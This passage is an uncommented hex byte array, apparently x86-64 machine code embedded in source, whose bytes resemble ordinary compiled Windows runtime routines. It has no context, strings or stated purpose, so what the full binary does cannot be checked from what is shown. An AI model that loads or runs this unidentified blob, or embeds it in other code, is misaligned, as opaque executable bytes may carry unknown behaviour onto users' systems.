0x4c, 0x8d, 0xd, 0x60, 0x83, 0x0, 0x0, 0xb9, 0x18, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0x50, 0x83, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x4d, 0x83, 0x0, 0x0, 0xe8, 0x18, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x20, 0x49, 0xba, 0x70, 0xc0, 0xd1, 0x34, 0xda, 0x17, 0xc0, 0xbd, 0x48, 0x8b, 0xd3, 0x48, 0xc7, 0xc1, 0xfa, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0xab, 0x68, 0x0, 0x0, 0xb8, 0x25, 0x2, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x4c, 0x8d, 0xd, 0xb9, 0x82, 0x0, 0x0, 0x33, 0xc9, 0x4c, 0x8d, 0x5, 0xac, 0x82, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xad, 0x82, 0x0, 0x0, 0xe8, 0xc8, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x15, 0x49, 0xba, 0x70, 0x30, 0x52, 0x5e, 0x47, 0x27, 0x5, 0xd3, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0x66, 0x68, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0xff, 0x25, 0x9d, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0xad, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0x95, 0x67, 0x0, 0x0, 0xcc, 0x48, 0xff, 0x25, 0x95, 0x67, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x41, 0x8b, 0xf0, 0x4c, 0x8d, 0xd, 0x63, 0x82, 0x0, 0x0, 0x8b, 0xda, 0x4c, 0x8d, 0x5, 0x52, 0x82, 0x0, 0x0, 0x48, 0x8b, 0xf9, 0x48, 0x8d, 0x15, 0x40, 0x78, 0x0, 0x0, 0xb9, 0xe, 0x0, 0x0, 0x0, 0xe8, 0x4e, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x1a, 0x49, 0xba, 0x70, 0xda, 0xd2, 0x32, 0x50, 0x3e, 0xa0, 0x82, 0x44, 0x8b, 0xc6, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0xe9, 0x67, 0x0, 0x0, 0xeb, 0xb, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x2c, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x41, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf2, 0x4c, 0x8d, 0xd, 0xf1, 0x81, 0x0, 0x0, 0x48, 0x8b, 0xe9, 0x4c, 0x8d, 0x5, 0xdf, 0x81, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xe0, 0x81, 0x0, 0x0, 0xb9, 0x10, 0x0, 0x0, 0x0, 0xe8, 0xd6, 0xfc, 0xff, 0xff, 0x4c, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x5f, 0x49, 0xba, 0x70, 0xe2, 0x57, 0x50, 0x62, 0x1f, 0xa1, 0xe3, 0x48, 0x8b, 0x94, 0x24, 0xa0, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xcb, 0x48, 0x8b, 0x8c, 0x24, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x54, 0x24, 0x40, 0x8b, 0xd6, 0x48, 0x89, 0x4c, 0x24, 0x38, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x8b, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x89, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0xcd, 0x48, 0x89, 0x44, 0x24, 0x20, 0x49, 0x8b, 0xc3, 0xff, 0x15, 0x29, 0x67, 0x0, 0x0, 0xeb, 0x32, 0x33, 0xd2, 0x48, 0x8b, 0xcd, 0xe8, 0x3d, 0x0, 0x0, 0x0, 0x8b, 0xc8, 0x44, 0x8b, 0xcb, 0x8b, 0x84, 0x24, 0x88, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc7, 0x89, 0x44, 0x24, 0x28, 0x8b, 0xd6, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x15, 0x5d, 0x66, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xfa, 0x4c, 0x8d, 0xd, 0x2d, 0x81, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0x23, 0x81, 0x0, 0x0, 0xb9, 0x12, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x5, 0xf, 0x81, 0x0, 0x0, 0xe8, 0xfa, 0xfb, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x17, 0x49, 0xba, 0x70, 0x32, 0xd8, 0x54, 0x23, 0x6, 0xdd, 0xea, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x98, 0x66, 0x0, 0x0, 0xeb, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0x7e, 0x24, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x48, 0x8b, 0x5, 0xec, 0x4, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0xd5, 0x15, 0x1, 0x0, 0xb9, 0x1e, 0x0, 0x0, 0x0, 0xf3, 0x48, 0xab, 0x48, 0x8b, 0x7c, 0x24, 0x10, 0xb0, 0x1, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x84, 0xc9, 0x75, 0x2f, 0x48, 0x8d, 0x1d, 0x13, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xb, 0x48, 0x85, 0xc9, 0x74, 0x10, 0x48, 0x83, 0xf9, 0xff, 0x74, 0x6, 0xff, 0x15, 0xaf, 0x64, 0x0, 0x0, 0x48, 0x83, 0x23, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x8d, 0x5, 0x88, 0x15, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x75, 0xd8, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xff, 0x15, 0x7e, 0x65, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x48, 0x89, 0x5, 0x5c, 0x16, 0x1, 0x0, 0xf, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0x25, 0x4c, 0x16, 0x1, 0x0, 0x0, 0xb0, 0x1, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x81, 0xec, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x48, 0x88, 0xff, 0x15, 0xc2, 0x63, 0x0, 0x0, 0x45, 0x33, 0xf6, 0x66, 0x44, 0x39, 0x74, 0x24, 0x62, 0xf, 0x84, 0x9a, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x8c, 0x0, 0x0, 0x0, 0x48, 0x63, 0x18, 0x48, 0x8d, 0x70, 0x4, 0xbf, 0x0, 0x20, 0x0, 0x0, 0x48, 0x3, 0xde, 0x39, 0x38, 0xf, 0x4c, 0x38, 0x8b, 0xcf, 0xe8, 0x22, 0x25, 0x0, 0x0, 0x3b, 0x3d, 0xf4, 0x19, 0x1, 0x0, 0xf, 0x4f, 0x3d, 0xed, 0x19, 0x1, 0x0, 0x85, 0xff, 0x74, 0x60, 0x41, 0x8b, 0xee, 0x48, 0x83, 0x3b, 0xff, 0x74, 0x47, 0x48, 0x83, 0x3b, 0xfe, 0x74, 0x41, 0xf6, 0x6, 0x1, 0x74, 0x3c, 0xf6, 0x6, 0x8, 0x75, 0xd, 0x48, 0x8b, 0xb, 0xff, 0x15, 0xdf, 0x64, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x2a, 0x48, 0x8b, 0xc5, 0x4c, 0x8d, 0x5, 0xb9, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xcd, 0x48, 0xc1, 0xf9, 0x6, 0x83, 0xe0, 0x3f, 0x49, 0x8b, 0xc, 0xc8, 0x48, 0x8d, 0x14, 0xc0, 0x48, 0x8b, 0x3, 0x48, 0x89, 0x44, 0xd1, 0x28, 0x8a, 0x6, 0x88, 0x44, 0xd1, 0x38, 0x48, 0xff, 0xc5, 0x48, 0xff, 0xc6, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xef, 0x1, 0x75, 0xa3, 0x4c, 0x8d, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x6b, 0x18, 0x49, 0x8b, 0x73, 0x20, 0x49, 0x8b, 0x7b, 0x28, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x33, 0xf6, 0x45, 0x33, 0xf6, 0x48, 0x63, 0xce, 0x48, 0x8d, 0x3d, 0x40, 0x15, 0x1, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0x1c, 0xc9, 0x48, 0x8b, 0x3c, 0xc7, 0x48, 0x8b, 0x44, 0xdf, 0x28, 0x48, 0x83, 0xc0, 0x2, 0x48, 0x83, 0xf8, 0x1, 0x76, 0xa, 0x80, 0x4c, 0xdf, 0x38, 0x80, 0xe9, 0x8b, 0x0, 0x0, 0x0, 0xc6, 0x44, 0xdf, 0x38, 0x81, 0x8b, 0xce, 0x85, 0xf6, 0x74, 0x16, 0x83, 0xe9, 0x1, 0x74, 0xa, 0x83, 0xf9, 0x1, 0xb9, 0xf4, 0xff, 0xff, 0xff, 0xeb, 0xc, 0xb9, 0xf5, 0xff, 0xff, 0xff, 0xeb, 0x5, 0xb9, 0xf6, 0xff, 0xff, 0xff, 0xff, 0x15, 0xf9, 0x63, 0x0, 0x0, 0x48, 0x8b, 0xe8, 0x48, 0x8d, 0x48, 0x1, 0x48, 0x83, 0xf9, 0x1, 0x76, 0x2d, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0xeb, 0x63, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x20, 0xf, 0xb6, 0xc0, 0x48, 0x89, 0x6c, 0xdf, 0x28, 0x83, 0xf8, 0x2, 0x75, 0x7, 0x80, 0x4c, 0xdf, 0x38, 0x40, 0xeb, 0x31, 0x83, 0xf8, 0x3, 0x75, 0x2c, 0x80, 0x4c, 0xdf, 0x38, 0x8, 0xeb, 0x25, 0x80, 0x4c, 0xdf, 0x38, 0x40, 0x48, 0xc7, 0x44, 0xdf, 0x28, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5, 0xe2, 0x18, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xb, 0x49, 0x8b, 0x4, 0x6, 0xc7, 0x40, 0x18, 0xfe, 0xff, 0xff, 0xff, 0xff, 0xc6, 0x49, 0x83, 0xc6, 0x8, 0x83, 0xfe, 0x3, 0xf, 0x85, 0x31, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x38, 0xd7, 0xff, 0xff, 0x33, 0xdb, 0x33, 0xc9, 0xe8, 0x6f, 0x23, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xc, 0xe8, 0xe6, 0xfd, 0xff, 0xff, 0xe8, 0xd1, 0xfe, 0xff, 0xff, 0xb3, 0x1, 0xb9, 0x7, 0x0, 0x0, 0x0, 0xe8, 0x69, 0xd7, 0xff, 0xff, 0x8a, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xdb, 0x48, 0x8d, 0x3d, 0x11, 0x14, 0x1, 0x0, 0x48, 0x8b, 0xc, 0x3b, 0x48, 0x85, 0xc9, 0x74, 0xa, 0xe8, 0xdb, 0x22, 0x0, 0x0, 0x48, 0x83, 0x24, 0x3b, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x81, 0xfb, 0x0, 0x4, 0x0, 0x0, 0x72, 0xd9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xca, 0x74, 0x68, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x14, 0x49, 0xba, 0x70, 0xa2, 0x5c, 0x5c, 0xc4, 0x9e, 0x94, 0xdf, 0xff, 0x15, 0x47, 0x63, 0x0, 0x0, 0x84, 0xc0, 0x74, 0x9, 0x48, 0x83, 0xc3, 0x10, 0x48, 0x3b, 0xde, 0x75, 0xdb, 0x48, 0x3b, 0xde, 0x74, 0x3b, 0x48, 0x3b, 0xdf, 0x74, 0x32, 0x48, 0x83, 0xc3, 0xf8, 0x48, 0x83, 0x7b, 0xf8, 0x0, 0x74, 0x1a, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x3b, 0x59, 0x3e, 0x75, 0xa6, 0x99, 0x97, 0x33, 0xc9, 0xff, 0x15, 0xb, 0x63, 0x0, 0x0, 0x48, 0x83, 0xeb, 0x10, 0x48, 0x8d, 0x43, 0x8, 0x48, 0x3b, 0xc7, 0x75, 0xd2, 0x32, 0xc0, 0xeb, 0x2, 0xb0, 0x1, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x3b, 0xca, 0x74, 0x24, 0x48, 0x8b, 0x43, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x12, 0x49, 0xba, 0x70, 0x3b, 0x59, 0x3e, 0x75, 0xa6, 0x99, 0x97, 0x33, 0xc9, 0xff, 0x15, 0xb8, 0x62, 0x0, 0x0, 0x48, 0x83, 0xeb, 0x10, 0x48, 0x3b, 0xdf, 0x75, 0xdc, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x9, 0x17, 0x1, 0x0, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x2e, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x1e, 0x49, 0xba, 0x70, 0x20, 0xd3, 0x1c, 0xdf, 0xf, 0xed, 0xd1, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x72, 0x62, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x33, 0xc9, 0xe8, 0x9f, 0xd5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0xbf, 0x0, 0x1, 0x0, 0x8b, 0xcb, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0x1d, 0xab, 0x16, 0x1, 0x0, 0x48, 0xd3, 0xcb, 0x33, 0xc9, 0xe8, 0xd5, 0xd5, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x8b, 0xa, 0xe8, 0x5f, 0xd5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0x7f, 0x0, 0x1, 0x0, 0x8b, 0xcb, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0x1d, 0x83, 0x16, 0x1, 0x0, 0x48, 0xd3, 0xcb, 0x8b, 0xf, 0xe8, 0x95, 0xd5, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xdc, 0x48, 0x83, 0xec, 0x28, 0xb8, 0x3, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x4b, 0x10, 0x4d, 0x8d, 0x43, 0x8, 0x89, 0x44, 0x24, 0x38, 0x49, 0x8d, 0x53, 0x18, 0x89, 0x44, 0x24, 0x40, 0x49, 0x8d, 0x4b, 0x8, 0xe8, 0x8f, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x21, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x22, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x23, 0x16, 0x1, 0x0, 0x48, 0x89, 0xd, 0x24, 0x16, 0x1, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xd9, 0x45, 0x33, 0xed, 0x44, 0x21, 0x6c, 0x24, 0x78, 0x41, 0xb6, 0x1, 0x44, 0x88, 0x74, 0x24, 0x70, 0x83, 0xf9, 0x2, 0x74, 0x21, 0x83, 0xf9, 0x4, 0x74, 0x4c, 0x83, 0xf9, 0x6, 0x74, 0x17, 0x83, 0xf9, 0x8, 0x74, 0x42, 0x83, 0xf9, 0xb, 0x74, 0x3d, 0x83, 0xf9, 0xf, 0x74, 0x8, 0x8d, 0x41, 0xeb, 0x83, 0xf8, 0x1, 0x77, 0x7d, 0x83, 0xe9, 0x2, 0xf, 0x84, 0xaf, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x4, 0xf, 0x84, 0x8b, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x9, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x83, 0xe9, 0x6, 0xf, 0x84, 0x82, 0x0, 0x0, 0x0, 0x83, 0xf9, 0x1, 0x74, 0x74, 0x33, 0xff, 0xe9, 0x8f, 0x0, 0x0, 0x0, 0xe8, 0x32, 0xd2, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x48, 0x85, 0xc0, 0x75, 0x18, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0x48, 0x8b, 0x0, 0x48, 0x8b, 0xd, 0x50, 0x72, 0x0, 0x0, 0x48, 0xc1, 0xe1, 0x4, 0x48, 0x3, 0xc8, 0xeb, 0x9, 0x39, 0x58, 0x4, 0x74, 0xb, 0x48, 0x83, 0xc0, 0x10, 0x48, 0x3b, 0xc1, 0x75, 0xf2, 0x33, 0xc0, 0x48, 0x85, 0xc0, 0x75, 0x12, 0xe8, 0x85, 0xd9, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x3e, 0xd8, 0xff, 0xff, 0xeb, 0xae, 0x48, 0x8d, 0x78, 0x8, 0x45, 0x32, 0xf6, 0x44, 0x88, 0x74, 0x24, 0x70, 0xeb, 0x22, 0x48, 0x8d, 0x3d, 0x2b, 0x15, 0x1, 0x0, 0xeb, 0x19, 0x48, 0x8d, 0x3d, 0x1a, 0x15, 0x1, 0x0, 0xeb, 0x10, 0x48, 0x8d, 0x3d, 0x21, 0x15, 0x1, 0x0, 0xeb, 0x7, 0x48, 0x8d, 0x3d, 0x0, 0x15, 0x1, 0x0, 0x48, 0x83, 0xa4, 0x24, 0x80, 0x0, 0x0, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x74, 0xb, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc0, 0xd3, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x37, 0x45, 0x84, 0xf6, 0x74, 0x12, 0x48, 0x8b, 0x5, 0xd8, 0xfe, 0x0, 0x0, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0xf0, 0x48, 0xd3, 0xce, 0x48, 0x83, 0xfe, 0x1, 0xf, 0x84, 0x94, 0x0, 0x0, 0x0, 0x48, 0x85, 0xf6, 0xf, 0x84, 0x17, 0x1, 0x0, 0x0, 0x41, 0xbc, 0x10, 0x9, 0x0, 0x0, 0x83, 0xfb, 0xb, 0x77, 0x3d, 0x41, 0xf, 0xa3, 0xdc, 0x73, 0x37, 0x49, 0x8b, 0x45, 0x8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x83, 0x65, 0x8, 0x0, 0x83, 0xfb, 0x8, 0x75, 0x53, 0xe8, 0xb9, 0xcf, 0xff, 0xff, 0x8b, 0x40, 0x10, 0x89, 0x44, 0x24, 0x78, 0x89, 0x44, 0x24, 0x20, 0xe8, 0xa9, 0xcf, 0xff, 0xff, 0xc7, 0x40, 0x10, 0x8c, 0x0, 0x0, 0x0, 0x83, 0xfb, 0x8, 0x75, 0x32, 0x48, 0x8b, 0x5, 0x5e, 0x71, 0x0, 0x0, 0x48, 0xc1, 0xe0, 0x4, 0x49, 0x3, 0x45, 0x0, 0x48, 0x8b, 0xd, 0x57, 0x71, 0x0, 0x0, 0x48, 0xc1, 0xe1, 0x4, 0x48, 0x3, 0xc8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x3b, 0xc1, 0x74, 0x1d, 0x48, 0x83, 0x60, 0x8, 0x0, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0xeb, 0x48, 0x8b, 0x5, 0x34, 0xfe, 0x0, 0x0, 0x48, 0x89, 0x7, 0xeb, 0x6, 0x41, 0xbc, 0x10, 0x9, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x74, 0xa, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x46, 0xd3, 0xff, 0xff, 0x48, 0x83, 0xfe, 0x1, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0x8e, 0xfe, 0xff, 0xff, 0x83, 0xfb, 0x8, 0x75, 0x23, 0xe8, 0x33, 0xcf, 0xff, 0xff, 0x49, 0xba, 0x70, 0x33, 0xd3, 0x30, 0x4f, 0x1f, 0x9c, 0x8b, 0x8b, 0x50, 0x10, 0x8b, 0xcb, 0x48, 0x8b, 0xc6, 0x4c, 0x8b, 0x5, 0x72, 0x5f, 0x0, 0x0, 0x41, 0xff, 0xd0, 0xeb, 0x18, 0x49, 0xba, 0x70, 0x73, 0xd7, 0x50, 0x49, 0x86, 0xc1, 0xc6, 0x8b, 0xcb, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x15, 0x57, 0x5f, 0x0, 0x0, 0xff, 0xd2, 0x83, 0xfb, 0xb, 0x77, 0xb4, 0x41, 0xf, 0xa3, 0xdc, 0x73, 0xae, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x0, 0x0, 0x0, 0x49, 0x89, 0x45, 0x8, 0x83, 0xfb, 0x8, 0x75, 0x9d, 0xe8, 0xdc, 0xce, 0xff, 0xff, 0x8b, 0x4c, 0x24, 0x78, 0x89, 0x48, 0x10, 0xeb, 0x8f, 0x45, 0x84, 0xf6, 0x74, 0x8, 0x8d, 0x4e, 0x3, 0xe8, 0xc2, 0xd2, 0xff, 0xff, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0xc8, 0xbe, 0xff, 0xff, 0x90, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0x15, 0x81, 0xfd, 0x0, 0x0, 0x8b, 0xca, 0x48, 0x33, 0x15, 0x98, 0x13, 0x1, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xca, 0x48, 0x85, 0xd2, 0xf, 0x95, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0xd, 0x81, 0x13, 0x1, 0x0, 0xc3, 0x48, 0x8b, 0x15, 0x59, 0xfd, 0x0, 0x0, 0x4c, 0x8b, 0xc1, 0x8b, 0xca, 0x48, 0x33, 0x15, 0x6d, 0x13, 0x1, 0x0, 0x83, 0xe1, 0x3f, 0x48, 0xd3, 0xca, 0x48, 0x85, 0xd2, 0x75, 0x3, 0x33, 0xc0, 0xc3, 0x49, 0xba, 0x70, 0x71, 0x54, 0x58, 0xe6, 0x7, 0x88, 0xd8, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0xc2, 0x48, 0xff, 0x25, 0xb0, 0x5e, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0x48, 0x8b, 0xa, 0xe8, 0xa3, 0x4, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x53, 0x8, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x48, 0x85, 0xc9, 0x74, 0x5a, 0x8b, 0x49, 0x14, 0x8b, 0xc1, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x4e, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x5, 0xf6, 0xc1, 0xc0, 0x75, 0xa, 0xf, 0xba, 0xe1, 0xb, 0x72, 0x4, 0xff, 0x2, 0xeb, 0x37, 0x48, 0x8b, 0x43, 0x10, 0x80, 0x38, 0x0, 0x75, 0xf, 0x48, 0x8b, 0x3, 0x48, 0x8b, 0x8, 0x8b, 0x41, 0x14, 0xd1, 0xe8, 0x24, 0x1, 0x74, 0x1f, 0x48, 0x8b, 0xb, 0x48, 0x8b, 0x9, 0xe8, 0xf5, 0x1, 0x0, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x8, 0x48, 0x8b, 0x43, 0x8, 0xff, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x43, 0x18, 0x83, 0x8, 0xff, 0x48, 0x8b, 0xf, 0xe8, 0x3d, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x56, 0x48, 0x83, 0xec, 0x60, 0x49, 0x8b, 0xf9, 0x49, 0x8b, 0xf0, 0x8b, 0xa, 0xe8, 0x45, 0xd1, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x1d, 0x9d, 0x12, 0x1, 